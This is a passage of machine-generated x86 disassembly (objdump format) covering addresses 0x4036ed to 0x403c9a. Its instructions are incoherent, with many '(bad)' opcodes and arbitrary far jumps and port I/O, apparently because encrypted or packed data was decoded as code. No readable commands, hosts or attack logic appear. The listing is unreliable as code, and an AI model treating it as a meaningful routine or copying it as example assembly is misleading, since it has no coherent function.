  4036ed:	e3 da                	jecxz  0x4036c9
  4036ef:	8f                   	(bad)
  4036f0:	7f 54                	jg     0x403746
  4036f2:	a1 7d b6 72 cf       	mov    0xcf72b67d,%eax
  4036f7:	2a ab bf 3c c0 41    	sub    0x41c03cbf(%ebx),%ch
  4036fd:	19 5d cd             	sbb    %ebx,-0x33(%ebp)
  403700:	04 b1                	add    $0xb1,%al
  403702:	19 df                	sbb    %ebx,%edi
  403704:	94                   	xchg   %eax,%esp
  403705:	2d 16 e0 9f e2       	sub    $0xe29fe016,%eax
  40370a:	24 a2                	and    $0xa2,%al
  40370c:	53                   	push   %ebx
  40370d:	43                   	inc    %ebx
  40370e:	b1 62                	mov    $0x62,%cl
  403710:	70 62                	jo     0x403774
  403712:	60                   	pusha
  403713:	88 79 a0             	mov    %bh,-0x60(%ecx)
  403716:	40                   	inc    %eax
  403717:	4f                   	dec    %edi
  403718:	d6                   	salc
  403719:	74 61                	je     0x40377c
  40371b:	2e 72 c8             	jb,pn  0x4036e6
  40371e:	0f 46 1c 9b          	cmovbe (%ebx,%ebx,4),%ebx
  403722:	2d f3 f7 8c ba       	sub    $0xba8cf7f3,%eax
  403727:	6b bf 1f 6f e3 20 0b 	imul   $0xb,0x20e36f1f(%edi),%edi
  40372e:	96                   	xchg   %eax,%esi
  40372f:	c9                   	leave
  403730:	9e                   	sahf
  403731:	25 21 bc cf 9a       	and    $0x9acfbc21,%eax
  403736:	8e 6b e1             	mov    -0x1f(%ebx),%gs
  403739:	9c                   	pushf
  40373a:	f1                   	int1
  40373b:	fd                   	std
  40373c:	5a                   	pop    %edx
  40373d:	45                   	inc    %ebp
  40373e:	1e                   	push   %ds
  40373f:	52                   	push   %edx
  403740:	60                   	pusha
  403741:	df d4                	(bad)
  403743:	1c a9                	sbb    $0xa9,%al
  403745:	57                   	push   %edi
  403746:	d3 66 bb             	shll   %cl,-0x45(%esi)
  403749:	0a e0                	or     %al,%ah
  40374b:	db 6e 10             	fldt   0x10(%esi)
  40374e:	6f                   	outsl  %ds:(%esi),(%dx)
  40374f:	a0 89 8e 00 a2       	mov    0xa2008e89,%al
  403754:	cb                   	lret
  403755:	b5 f8                	mov    $0xf8,%ch
  403757:	8c ef                	mov    %gs,%edi
  403759:	98                   	cwtl
  40375a:	3c 85                	cmp    $0x85,%al
  40375c:	53                   	push   %ebx
  40375d:	38 29                	cmp    %ch,(%ecx)
  40375f:	bb 3b 3c 17 cf       	mov    $0xcf173c3b,%ebx
  403764:	13 ce                	adc    %esi,%ecx
  403766:	72 a9                	jb     0x403711
  403768:	d8 43 0a             	fadds  0xa(%ebx)
  40376b:	21 39                	and    %edi,(%ecx)
  40376d:	33 50 33             	xor    0x33(%eax),%edx
  403770:	bf 6d 5f 36 b8       	mov    $0xb8365f6d,%edi
  403775:	42                   	inc    %edx
  403776:	6c                   	insb   (%dx),%es:(%edi)
  403777:	82 fc e4             	cmp    $0xe4,%ah
  40377a:	10 3f                	adc    %bh,(%edi)
  40377c:	b8 e9 fc a9 7e       	mov    $0x7ea9fce9,%eax
  403781:	27                   	daa
  403782:	b5 c2                	mov    $0xc2,%ch
  403784:	24 78                	and    $0x78,%al
  403786:	d4 c5                	aam    $0xc5
  403788:	ec                   	in     (%dx),%al
  403789:	d7                   	xlat   %ds:(%ebx)
  40378a:	65 e6 78             	gs out %al,$0x78
  40378d:	3b 29                	cmp    (%ecx),%ebp
  40378f:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403790:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  403791:	b6 bb                	mov    $0xbb,%dh
  403793:	db fa                	(bad)
  403795:	bf b0 b1 00 c1       	mov    $0xc100b1b0,%edi
  40379a:	f7 c6 03 49 e4 f8    	test   $0xf8e44903,%esi
  4037a0:	5e                   	pop    %esi
  4037a1:	b6 b2                	mov    $0xb2,%dh
  4037a3:	71 2a                	jno    0x4037cf
  4037a5:	f6 2d e3 f6 4b c6    	imulb  0xc64bf6e3
  4037ab:	56                   	push   %esi
  4037ac:	b0 aa                	mov    $0xaa,%al
  4037ae:	51                   	push   %ecx
  4037af:	51                   	push   %ecx
  4037b0:	50                   	push   %eax
  4037b1:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4037b2:	de 64 b0 52          	fisubs 0x52(%eax,%esi,4)
  4037b6:	9f                   	lahf
  4037b7:	3e ea f2 da 56 f1 c6 	ds ljmp $0x42c6,$0xf156daf2
  4037be:	42 
  4037bf:	1d 44 77 dc fe       	sbb    $0xfedc7744,%eax
  4037c4:	c2 5f 8c             	ret    $0x8c5f
  4037c7:	00 7e 06             	add    %bh,0x6(%esi)
  4037ca:	21 24 95 7d 86 e1 c6 	and    %esp,-0x391e7983(,%edx,4)
  4037d1:	d6                   	salc
  4037d2:	76 19                	jbe    0x4037ed
  4037d4:	17                   	pop    %ss
  4037d5:	87 42 ef             	xchg   %eax,-0x11(%edx)
  4037d8:	19 e3                	sbb    %esp,%ebx
  4037da:	60                   	pusha
  4037db:	64 61                	fs popa
  4037dd:	77 9f                	ja     0x40377e
  4037df:	36 73 dd             	ss jae 0x4037bf
  4037e2:	48                   	dec    %eax
  4037e3:	d4 44                	aam    $0x44
  4037e5:	1e                   	push   %ds
  4037e6:	e9 24 11 16 fc       	jmp    0xfc56490f
  4037eb:	93                   	xchg   %eax,%ebx
  4037ec:	c9                   	leave
  4037ed:	d2 08                	rorb   %cl,(%eax)
  4037ef:	88 49 0e             	mov    %cl,0xe(%ecx)
  4037f2:	a3 d5 3f 20 7a       	mov    %eax,0x7a203fd5
  4037f7:	57                   	push   %edi
  4037f8:	d5 9d                	aad    $0x9d
  4037fa:	07                   	pop    %es
  4037fb:	f5                   	cmc
  4037fc:	32 9e 03 a5 a2 88    	xor    -0x775d5afd(%esi),%bl
  403802:	bd 3c c8 b7 41       	mov    $0x41b7c83c,%ebp
  403807:	3e 8e 2e             	mov    %ds:(%esi),%gs
  40380a:	dc 61 af             	fsubl  -0x51(%ecx)
  40380d:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40380e:	41                   	inc    %ecx
  40380f:	0e                   	push   %cs
  403810:	dd fd                	(bad)
  403812:	4c                   	dec    %esp
  403813:	52                   	push   %edx
  403814:	30 af f9 2e 25 08    	xor    %ch,0x8252ef9(%edi)
  40381a:	03 bd 25 fd d7 76    	add    0x76d7fd25(%ebp),%edi
  403820:	8c 05 06 6f 59 46    	mov    %es,0x46596f06
  403826:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  403827:	66 00 3e             	data16 add %bh,(%esi)
  40382a:	b7 d1                	mov    $0xd1,%bh
  40382c:	f1                   	int1
  40382d:	ca c5 c5             	lret   $0xc5c5
  403830:	ed                   	in     (%dx),%eax
  403831:	36 5e                	ss pop %esi
  403833:	13 5e 48             	adc    0x48(%esi),%ebx
  403836:	35 84 f9 cf e2       	xor    $0xe2cff984,%eax
  40383b:	10 da                	adc    %bl,%dl
  40383d:	01 54 c2 2f          	add    %edx,0x2f(%edx,%eax,8)
  403841:	30 3b                	xor    %bh,(%ebx)
  403843:	f3 80 fa f7          	repz cmp $0xf7,%dl
  403847:	67 f9                	addr16 stc
  403849:	13 91 9f c8 cd fe    	adc    -0x1323761(%ecx),%edx
  40384f:	4b                   	dec    %ebx
  403850:	f6 25 1d 90 49 d7    	mulb   0xd749901d
  403856:	f1                   	int1
  403857:	6c                   	insb   (%dx),%es:(%edi)
  403858:	3e 30 6a 05          	xor    %ch,%ds:0x5(%edx)
  40385c:	c1 da a5             	rcr    $0xa5,%edx
  40385f:	b4 a5                	mov    $0xa5,%ah
  403861:	2d a1 ac 72 6e       	sub    $0x6e72aca1,%eax
  403866:	74 fa                	je     0x403862
  403868:	1f                   	pop    %ds
  403869:	71 2a                	jno    0x403895
  40386b:	05 0d d3 f9 49       	add    $0x49f9d30d,%eax
  403870:	20 38                	and    %bh,(%eax)
  403872:	43                   	inc    %ebx
  403873:	71 aa                	jno    0x40381f
  403875:	12 68 f3             	adc    -0xd(%eax),%ch
  403878:	73 d3                	jae    0x40384d
  40387a:	59                   	pop    %ecx
  40387b:	48                   	dec    %eax
  40387c:	9d                   	popf
  40387d:	3e 0d 7b 4d 58 f6    	ds or  $0xf6584d7b,%eax
  403883:	34 86                	xor    $0x86,%al
  403885:	3d ec c7 78 13       	cmp    $0x1378c7ec,%eax
  40388a:	44                   	inc    %esp
  40388b:	fd                   	std
  40388c:	c9                   	leave
  40388d:	a3 ba 7c 2a 65       	mov    %eax,0x652a7cba
  403892:	de ed                	fsubrp %st,%st(5)
  403894:	79 1c                	jns    0x4038b2
  403896:	0f 5c 72 7e          	subps  0x7e(%edx),%xmm6
  40389a:	0e                   	push   %cs
  40389b:	e0 dd                	loopne 0x40387a
  40389d:	22 ad 2a 2b eb 06    	and    0x6eb2b2a(%ebp),%ch
  4038a3:	ca f4 8a             	lret   $0x8af4
  4038a6:	2a eb                	sub    %bl,%ch
  4038a8:	59                   	pop    %ecx
  4038a9:	b2 71                	mov    $0x71,%dl
  4038ab:	40                   	inc    %eax
  4038ac:	5d                   	pop    %ebp
  4038ad:	ff b4 87 3d 66 71 ac 	push   -0x538e99c3(%edi,%eax,4)
  4038b4:	c3                   	ret
  4038b5:	3a 21                	cmp    (%ecx),%ah
  4038b7:	19 87 fb 14 80 96    	sbb    %eax,-0x697feb05(%edi)
  4038bd:	88 ce                	mov    %cl,%dh
  4038bf:	0d bc b8 c8 8d       	or     $0x8dc8b8bc,%eax
  4038c4:	60                   	pusha
  4038c5:	9a 8d 05 82 0b f9 3a 	lcall  $0x3af9,$0xb82058d
  4038cc:	7f cb                	jg     0x403899
  4038ce:	75 ba                	jne    0x40388a
  4038d0:	44                   	inc    %esp
  4038d1:	8d 99 3a 85 4e ea    	lea    -0x15b17ac6(%ecx),%ebx
  4038d7:	f1                   	int1
  4038d8:	c7                   	(bad)
  4038d9:	fb                   	sti
  4038da:	43                   	inc    %ebx
  4038db:	3d 44 a1 2d 99       	cmp    $0x992da144,%eax
  4038e0:	25 36 ce 1b 53       	and    $0x531bce36,%eax
  4038e5:	f6 e3                	mul    %bl
  4038e7:	28 72 da             	sub    %dh,-0x26(%edx)
  4038ea:	10 7e 76             	adc    %bh,0x76(%esi)
  4038ed:	27                   	daa
  4038ee:	67 c5 56 8e          	lds    -0x72(%bp),%edx
  4038f2:	2e ea dc 62 08 a9 5f 	cs ljmp $0xdc5f,$0xa90862dc
  4038f9:	dc 
  4038fa:	f6 bd af b0 e8 4b    	idivb  0x4be8b0af(%ebp)
  403900:	d5 e0                	aad    $0xe0
  403902:	a8 94                	test   $0x94,%al
  403904:	7e d4                	jle    0x4038da
  403906:	79 4b                	jns    0x403953
  403908:	bb f3 07 df 1f       	mov    $0x1fdf07f3,%ebx
  40390d:	d6                   	salc
  40390e:	1b fe                	sbb    %esi,%edi
  403910:	7d f2                	jge    0x403904
  403912:	b9 bd 44 53 83       	mov    $0x835344bd,%ecx
  403917:	04 22                	add    $0x22,%al
  403919:	2b df                	sub    %edi,%ebx
  40391b:	73 3d                	jae    0x40395a
  40391d:	82 82 8c 1e 21 0a 47 	addb   $0x47,0xa211e8c(%edx)
  403924:	71 7f                	jno    0x4039a5
  403926:	b4 d5                	mov    $0xd5,%ah
  403928:	89 79 c9             	mov    %edi,-0x37(%ecx)
  40392b:	bb 8f 4b 29 0b       	mov    $0xb294b8f,%ebx
  403930:	4f                   	dec    %edi
  403931:	74 45                	je     0x403978
  403933:	32 5e d0             	xor    -0x30(%esi),%bl
  403936:	e3 a1                	jecxz  0x4038d9
  403938:	4c                   	dec    %esp
  403939:	7f 60                	jg     0x40399b
  40393b:	9a e3 45 a5 9e 8c 0a 	lcall  $0xa8c,$0x9ea545e3
  403942:	1f                   	pop    %ds
  403943:	d6                   	salc
  403944:	97                   	xchg   %eax,%edi
  403945:	fc                   	cld
  403946:	30 8f 5b 19 c3 1c    	xor    %cl,0x1cc3195b(%edi)
  40394c:	3a fd                	cmp    %ch,%bh
  40394e:	fe                   	(bad)
  40394f:	37                   	aaa
  403950:	96                   	xchg   %eax,%esi
  403951:	1a 73 a3             	sbb    -0x5d(%ebx),%dh
  403954:	57                   	push   %edi
  403955:	7c 29                	jl     0x403980
  403957:	1b 30                	sbb    (%eax),%esi
  403959:	73 2c                	jae    0x403987
  40395b:	48                   	dec    %eax
  40395c:	40                   	inc    %eax
  40395d:	72 05                	jb     0x403964
  40395f:	b2 c8                	mov    $0xc8,%dl
  403961:	b6 3a                	mov    $0x3a,%dh
  403963:	82 9d a5 14 16 a2 a1 	sbbb   $0xa1,-0x5de9eb5b(%ebp)
  40396a:	80 e6 b7             	and    $0xb7,%dh
  40396d:	2c 86                	sub    $0x86,%al
  40396f:	11 42 9c             	adc    %eax,-0x64(%edx)
  403972:	00 70 64             	add    %dh,0x64(%eax)
  403975:	c8 98 df d8          	enter  $0xdf98,$0xd8
  403979:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  40397a:	1b d8                	sbb    %eax,%ebx
  40397c:	f4                   	hlt
  40397d:	6d                   	insl   (%dx),%es:(%edi)
  40397e:	60                   	pusha
  40397f:	cd b2                	int    $0xb2
  403981:	38 fa                	cmp    %bh,%dl
  403983:	50                   	push   %eax
  403984:	4d                   	dec    %ebp
  403985:	b1 97                	mov    $0x97,%cl
  403987:	ec                   	in     (%dx),%al
  403988:	9a c3 6c 03 32 00 a9 	lcall  $0xa900,$0x32036cc3
  40398f:	71 b2                	jno    0x403943
  403991:	1c 6b                	sbb    $0x6b,%al
  403993:	e6 70                	out    %al,$0x70
  403995:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  403996:	e4 97                	in     $0x97,%al
  403998:	b6 64                	mov    $0x64,%dh
  40399a:	18 ee                	sbb    %ch,%dh
  40399c:	59                   	pop    %ecx
  40399d:	9a c0 c8 e1 de f5 f4 	lcall  $0xf4f5,$0xdee1c8c0
  4039a4:	b6 cd                	mov    $0xcd,%dh
  4039a6:	cf                   	iret
  4039a7:	56                   	push   %esi
  4039a8:	bb c9 3b 13 d0       	mov    $0xd0133bc9,%ebx
  4039ad:	54                   	push   %esp
  4039ae:	41                   	inc    %ecx
  4039af:	c7                   	(bad)
  4039b0:	5b                   	pop    %ebx
  4039b1:	c4 bb 95 fe f0 53    	les    0x53f0fe95(%ebx),%edi
  4039b7:	1d f3 b4 d2 15       	sbb    $0x15d2b4f3,%eax
  4039bc:	0d 92 1d 84 c9       	or     $0xc9841d92,%eax
  4039c1:	60                   	pusha
  4039c2:	b5 8c                	mov    $0x8c,%ch
  4039c4:	65 f1                	gs int1
  4039c6:	5e                   	pop    %esi
  4039c7:	2a b3 ed 2a 47 5c    	sub    0x5c472aed(%ebx),%dh
  4039cd:	4a                   	dec    %edx
  4039ce:	6e                   	outsb  %ds:(%esi),(%dx)
  4039cf:	a9 c2 1c 2c 04       	test   $0x42c1cc2,%eax
  4039d4:	00 1a                	add    %bl,(%edx)
  4039d6:	c8 fc e4 21          	enter  $0xe4fc,$0x21
  4039da:	c2 2f 52             	ret    $0x522f
  4039dd:	bb 77 9a 65 5c       	mov    $0x5c659a77,%ebx
  4039e2:	91                   	xchg   %eax,%ecx
  4039e3:	a9 30 c1 8a f5       	test   $0xf58ac130,%eax
  4039e8:	ff 6c e0 5b          	ljmp   *0x5b(%eax,%eiz,8)
  4039ec:	ff 70 ed             	push   -0x13(%eax)
  4039ef:	00 54 5b 41          	add    %dl,0x41(%ebx,%ebx,2)
  4039f3:	ae                   	scas   %es:(%edi),%al
  4039f4:	16                   	push   %ss
  4039f5:	43                   	inc    %ebx
  4039f6:	2f                   	das
  4039f7:	4a                   	dec    %edx
  4039f8:	68 74 17 32 0d       	push   $0xd321774
  4039fd:	33 df                	xor    %edi,%ebx
  4039ff:	c8 ea 97 6f          	enter  $0x97ea,$0x6f
  403a03:	95                   	xchg   %eax,%ebp
  403a04:	1c 79                	sbb    $0x79,%al
  403a06:	11 60 db             	adc    %esp,-0x25(%eax)
  403a09:	4d                   	dec    %ebp
  403a0a:	ea 95 71 52 95 16 f1 	ljmp   $0xf116,$0x95527195
  403a11:	c9                   	leave
  403a12:	bd 61 92 97 6b       	mov    $0x6b979261,%ebp
  403a17:	17                   	pop    %ss
  403a18:	9c                   	pushf
  403a19:	71 14                	jno    0x403a2f
  403a1b:	92                   	xchg   %eax,%edx
  403a1c:	94                   	xchg   %eax,%esp
  403a1d:	1c 3a                	sbb    $0x3a,%al
  403a1f:	da 05 81 4c e7 4d    	fiaddl 0x4de74c81
  403a25:	db 4d 13             	fisttpl 0x13(%ebp)
  403a28:	e6 e0                	out    %al,$0xe0
  403a2a:	d0 be 3d b2 ae 1e    	sarb   $1,0x1eaeb23d(%esi)
  403a30:	21 58 84             	and    %ebx,-0x7c(%eax)
  403a33:	88 0a                	mov    %cl,(%edx)
  403a35:	4d                   	dec    %ebp
  403a36:	d2 cb                	ror    %cl,%bl
  403a38:	7e 63                	jle    0x403a9d
  403a3a:	2d 68 0c 5b 9a       	sub    $0x9a5b0c68,%eax
  403a3f:	06                   	push   %es
  403a40:	10 f0                	adc    %dh,%al
  403a42:	2c d3                	sub    $0xd3,%al
  403a44:	d1 a1 cc 9d fc 75    	shll   $1,0x75fc9dcc(%ecx)
  403a4a:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403a4b:	c2 9d 70             	ret    $0x709d
  403a4e:	46                   	inc    %esi
  403a4f:	5f                   	pop    %edi
  403a50:	2a 82 fa 96 5d 9f    	sub    -0x60a26906(%edx),%al
  403a56:	91                   	xchg   %eax,%ecx
  403a57:	54                   	push   %esp
  403a58:	8c 78 ae             	mov    %?,-0x52(%eax)
  403a5b:	ea be 40 ea 1e 40 ec 	ljmp   $0xec40,$0x1eea40be
  403a62:	0e                   	push   %cs
  403a63:	25 66 03 10 51       	and    $0x51100366,%eax
  403a68:	ff 08                	decl   (%eax)
  403a6a:	89 fc                	mov    %edi,%esp
  403a6c:	56                   	push   %esi
  403a6d:	da 1e                	ficompl (%esi)
  403a6f:	5c                   	pop    %esp
  403a70:	3a 80 75 c6 23 75    	cmp    0x7523c675(%eax),%al
  403a76:	e9 09 97 8b 4c       	jmp    0x4ccbd184
  403a7b:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403a7c:	25 83 63 44 29       	and    $0x29446383,%eax
  403a81:	18 64 10 ea          	sbb    %ah,-0x16(%eax,%edx,1)
  403a85:	c9                   	leave
  403a86:	41                   	inc    %ecx
  403a87:	24 ea                	and    $0xea,%al
  403a89:	61                   	popa
  403a8a:	58                   	pop    %eax
  403a8b:	9f                   	lahf
  403a8c:	b6 98                	mov    $0x98,%dh
  403a8e:	01 95 54 f2 b9 c5    	add    %edx,-0x3a460dac(%ebp)
  403a94:	72 e7                	jb     0x403a7d
  403a96:	e5 60                	in     $0x60,%eax
  403a98:	ff                   	lcall  (bad)
  403a99:	dc 33                	fdivl  (%ebx)
  403a9b:	08 43 31             	or     %al,0x31(%ebx)
  403a9e:	bf 7b 38 3f 78       	mov    $0x783f387b,%edi
  403aa3:	64 76 73             	fs jbe 0x403b19
  403aa6:	c1 89 11 39 5b 25 30 	rorl   $0x30,0x255b3911(%ecx)
  403aad:	60                   	pusha
  403aae:	ba 92 42 ac 10       	mov    $0x10ac4292,%edx
  403ab3:	e2 75                	loop   0x403b2a
  403ab5:	84 0b                	test   %cl,(%ebx)
  403ab7:	1d 90 77 41 a4       	sbb    $0xa4417790,%eax
  403abc:	f0 ca 35 17          	lock lret $0x1735
  403ac0:	44                   	inc    %esp
  403ac1:	57                   	push   %edi
  403ac2:	7d 44                	jge    0x403b08
  403ac4:	12 f6                	adc    %dh,%dh
  403ac6:	dc 36                	fdivl  (%esi)
  403ac8:	b5 59                	mov    $0x59,%ch
  403aca:	a9 87 ef d8 e0       	test   $0xe0d8ef87,%eax
  403acf:	f4                   	hlt
  403ad0:	c1 7b 5e 82          	sarl   $0x82,0x5e(%ebx)
  403ad4:	89 0c a7             	mov    %ecx,(%edi,%eiz,4)
  403ad7:	c6                   	(bad)
  403ad8:	97                   	xchg   %eax,%edi
  403ad9:	07                   	pop    %es
  403ada:	ef                   	out    %eax,(%dx)
  403adb:	45                   	inc    %ebp
  403adc:	5e                   	pop    %esi
  403add:	5d                   	pop    %ebp
  403ade:	52                   	push   %edx
  403adf:	b5 51                	mov    $0x51,%ch
  403ae1:	67 35 af af b1 c5    	addr16 xor $0xc5b1afaf,%eax
  403ae7:	56                   	push   %esi
  403ae8:	ff 59 71             	lcall  *0x71(%ecx)
  403aeb:	9c                   	pushf
  403aec:	b6 77                	mov    $0x77,%dh
  403aee:	64 d4 7b             	fs aam $0x7b
  403af1:	5d                   	pop    %ebp
  403af2:	9a d1 29 f6 e6 82 84 	lcall  $0x8482,$0xe6f629d1
  403af9:	e2 03                	loop   0x403afe
  403afb:	80 31 a7             	xorb   $0xa7,(%ecx)
  403afe:	0f ab a2 69 34 93 2f 	bts    %esp,0x2f933469(%edx)
  403b05:	3e bf b1 17 aa 3e    	ds mov $0x3eaa17b1,%edi
  403b0b:	e5 79                	in     $0x79,%eax
  403b0d:	5e                   	pop    %esi
  403b0e:	37                   	aaa
  403b0f:	7e bb                	jle    0x403acc
  403b11:	9b                   	fwait
  403b12:	26 3f                	es aas
  403b14:	5d                   	pop    %ebp
  403b15:	cb                   	lret
  403b16:	6a 01                	push   $0x1
  403b18:	9f                   	lahf
  403b19:	27                   	daa
  403b1a:	8a 19                	mov    (%ecx),%bl
  403b1c:	de 10                	ficoms (%eax)
  403b1e:	98                   	cwtl
  403b1f:	d6                   	salc
  403b20:	41                   	inc    %ecx
  403b21:	89 d0                	mov    %edx,%eax
  403b23:	75 65                	jne    0x403b8a
  403b25:	bb 4e b1 3e ba       	mov    $0xba3eb14e,%ebx
  403b2a:	0b 25 30 60 18 38    	or     0x38186030,%esp
  403b30:	87 b5 50 0f fa 1e    	xchg   %esi,0x1efa0f50(%ebp)
  403b36:	a2 c0 94 0a bf       	mov    %al,0xbf0a94c0
  403b3b:	ac                   	lods   %ds:(%esi),%al
  403b3c:	48                   	dec    %eax
  403b3d:	cc                   	int3
  403b3e:	b7 e0                	mov    $0xe0,%bh
  403b40:	bb 91 eb f0 12       	mov    $0x12f0eb91,%ebx
  403b45:	4c                   	dec    %esp
  403b46:	c0 ca 10             	ror    $0x10,%dl
  403b49:	fb                   	sti
  403b4a:	7f eb                	jg     0x403b37
  403b4c:	86 e7                	xchg   %ah,%bh
  403b4e:	d7                   	xlat   %ds:(%ebx)
  403b4f:	b0 c9                	mov    $0xc9,%al
  403b51:	9d                   	popf
  403b52:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  403b53:	7b 76                	jnp    0x403bcb
  403b55:	f3 25 73 b8 4f 45    	repz and $0x454fb873,%eax
  403b5b:	55                   	push   %ebp
  403b5c:	f7 38                	idivl  (%eax)
  403b5e:	53                   	push   %ebx
  403b5f:	03 5a b1             	add    -0x4f(%edx),%ebx
  403b62:	8b 33                	mov    (%ebx),%esi
  403b64:	7e e3                	jle    0x403b49
  403b66:	09 8f 57 e2 c6 5b    	or     %ecx,0x5bc6e257(%edi)
  403b6c:	49                   	dec    %ecx
  403b6d:	88 d3                	mov    %dl,%bl
  403b6f:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403b70:	5f                   	pop    %edi
  403b71:	22 f4                	and    %ah,%dh
  403b73:	66 6d                	insw   (%dx),%es:(%edi)
  403b75:	41                   	inc    %ecx
  403b76:	46                   	inc    %esi
  403b77:	cc                   	int3
  403b78:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403b79:	12 34 5d 56 98 57 35 	adc    0x35579856(,%ebx,2),%dh
  403b80:	d2 99 33 f8 f9 7c    	rcrb   %cl,0x7cf9f833(%ecx)
  403b86:	5e                   	pop    %esi
  403b87:	2e 02 9d 39 2b e4 09 	add    %cs:0x9e42b39(%ebp),%bl
  403b8e:	93                   	xchg   %eax,%ebx
  403b8f:	ee                   	out    %al,(%dx)
  403b90:	e6 db                	out    %al,$0xdb
  403b92:	3d bb f4 13 e1       	cmp    $0xe113f4bb,%eax
  403b97:	b0 d5                	mov    $0xd5,%al
  403b99:	18 29                	sbb    %ch,(%ecx)
  403b9b:	93                   	xchg   %eax,%ebx
  403b9c:	10 6b dc             	adc    %ch,-0x24(%ebx)
  403b9f:	21 0e                	and    %ecx,(%esi)
  403ba1:	df 46 71             	filds  0x71(%esi)
  403ba4:	93                   	xchg   %eax,%ebx
  403ba5:	2b 8d 49 fb 2d a9    	sub    -0x56d204b7(%ebp),%ecx
  403bab:	05 64 a7 d6 e9       	add    $0xe9d6a764,%eax
  403bb0:	7f 6a                	jg     0x403c1c
  403bb2:	8e 5c 9f 11          	mov    0x11(%edi,%ebx,4),%ds
  403bb6:	5b                   	pop    %ebx
  403bb7:	2a 1e                	sub    (%esi),%bl
  403bb9:	06                   	push   %es
  403bba:	c0 db 0e             	rcr    $0xe,%bl
  403bbd:	eb 9b                	jmp    0x403b5a
  403bbf:	65 e1 c6             	gs loope 0x403b88
  403bc2:	ce                   	into
  403bc3:	43                   	inc    %ebx
  403bc4:	1c dd                	sbb    $0xdd,%al
  403bc6:	79 36                	jns    0x403bfe
  403bc8:	3b 94 1b 01 8b 50 76 	cmp    0x76508b01(%ebx,%ebx,1),%edx
  403bcf:	59                   	pop    %ecx
  403bd0:	00 fc                	add    %bh,%ah
  403bd2:	06                   	push   %es
  403bd3:	fa                   	cli
  403bd4:	1b 41 9a             	sbb    -0x66(%ecx),%eax
  403bd7:	ee                   	out    %al,(%dx)
  403bd8:	ee                   	out    %al,(%dx)
  403bd9:	44                   	inc    %esp
  403bda:	e6 c5                	out    %al,$0xc5
  403bdc:	54                   	push   %esp
  403bdd:	94                   	xchg   %eax,%esp
  403bde:	97                   	xchg   %eax,%edi
  403bdf:	5f                   	pop    %edi
  403be0:	23 00                	and    (%eax),%eax
  403be2:	22 0b                	and    (%ebx),%cl
  403be4:	6a 5d                	push   $0x5d
  403be6:	46                   	inc    %esi
  403be7:	dd 34 fb             	fnsave (%ebx,%edi,8)
  403bea:	12 e9                	adc    %cl,%ch
  403bec:	98                   	cwtl
  403bed:	ae                   	scas   %es:(%edi),%al
  403bee:	a9 72 67 6d b6       	test   $0xb66d6772,%eax
  403bf3:	b0 ab                	mov    $0xab,%al
  403bf5:	09 12                	or     %edx,(%edx)
  403bf7:	68 3f 2e 7b 19       	push   $0x197b2e3f
  403bfc:	26 13 57 b2          	adc    %es:-0x4e(%edi),%edx
  403c00:	f8                   	clc
  403c01:	fa                   	cli
  403c02:	f4                   	hlt
  403c03:	89 35 05 31 5e 47    	mov    %esi,0x475e3105
  403c09:	8c d3                	mov    %ss,%ebx
  403c0b:	3e d3 78 31          	sarl   %cl,%ds:0x31(%eax)
  403c0f:	97                   	xchg   %eax,%edi
  403c10:	18 24 c2             	sbb    %ah,(%edx,%eax,8)
  403c13:	26 1f                	es pop %ds
  403c15:	3f                   	aas
  403c16:	75 50                	jne    0x403c68
  403c18:	ba 4d 0c 23 54       	mov    $0x54230c4d,%edx
  403c1d:	f1                   	int1
  403c1e:	3d 2c 5d 0d d7       	cmp    $0xd70d5d2c,%eax
  403c23:	52                   	push   %edx
  403c24:	dd c0                	ffree  %st(0)
  403c26:	05 1b 4d 23 9e       	add    $0x9e234d1b,%eax
  403c2b:	26 b1 d6             	es mov $0xd6,%cl
  403c2e:	66 b0 80             	data16 mov $0x80,%al
  403c31:	95                   	xchg   %eax,%ebp
  403c32:	ad                   	lods   %ds:(%esi),%eax
  403c33:	11 3b                	adc    %edi,(%ebx)
  403c35:	ce                   	into
  403c36:	ff a5 58 56 1d 19    	jmp    *0x191d5658(%ebp)
  403c3c:	3d 39 69 f6 11       	cmp    $0x11f66939,%eax
  403c41:	23 b4 d9 2c 2f 97 93 	and    -0x6c68d0d4(%ecx,%ebx,8),%esi
  403c48:	60                   	pusha
  403c49:	b4 8a                	mov    $0x8a,%ah
  403c4b:	13 c5                	adc    %ebp,%eax
  403c4d:	a0 ec de e3 2c       	mov    0x2ce3deec,%al
  403c52:	00 62 38             	add    %ah,0x38(%edx)
  403c55:	67 34 8c             	addr16 xor $0x8c,%al
  403c58:	d1 0e                	rorl   $1,(%esi)
  403c5a:	c0 60 6d 1d          	shlb   $0x1d,0x6d(%eax)
  403c5e:	e7 0b                	out    %eax,$0xb
  403c60:	0b 32                	or     (%edx),%esi
  403c62:	92                   	xchg   %eax,%edx
  403c63:	90                   	nop
  403c64:	f2 c8 2a 07 f7       	repnz enter $0x72a,$0xf7
  403c69:	db 72 cb             	(bad) -0x35(%edx)
  403c6c:	c8 85 26 ee          	enter  $0x2685,$0xee
  403c70:	99                   	cltd
  403c71:	b9 48 4f 54 f6       	mov    $0xf6544f48,%ecx
  403c76:	bb d4 79 5e 99       	mov    $0x995e79d4,%ebx
  403c7b:	4d                   	dec    %ebp
  403c7c:	b7 c7                	mov    $0xc7,%bh
  403c7e:	01 1f                	add    %ebx,(%edi)
  403c80:	2c 6b                	sub    $0x6b,%al
  403c82:	13 aa 65 fa 77 f7    	adc    -0x888059b(%edx),%ebp
  403c88:	52                   	push   %edx
  403c89:	4d                   	dec    %ebp
  403c8a:	6f                   	outsl  %ds:(%esi),(%dx)
  403c8b:	51                   	push   %ecx
  403c8c:	cd f8                	int    $0xf8
  403c8e:	a1 1c 87 55 bb       	mov    0xbb55871c,%eax
  403c93:	9f                   	lahf
  403c94:	5b                   	pop    %ebx
  403c95:	8f                   	(bad)
  403c96:	ef                   	out    %eax,(%dx)
  403c97:	d8 e8                	fsubr  %st(0),%st
  403c99:	4d                   	dec    %ebp
  403c9a:	7c 9e                	jl     0x403c3a
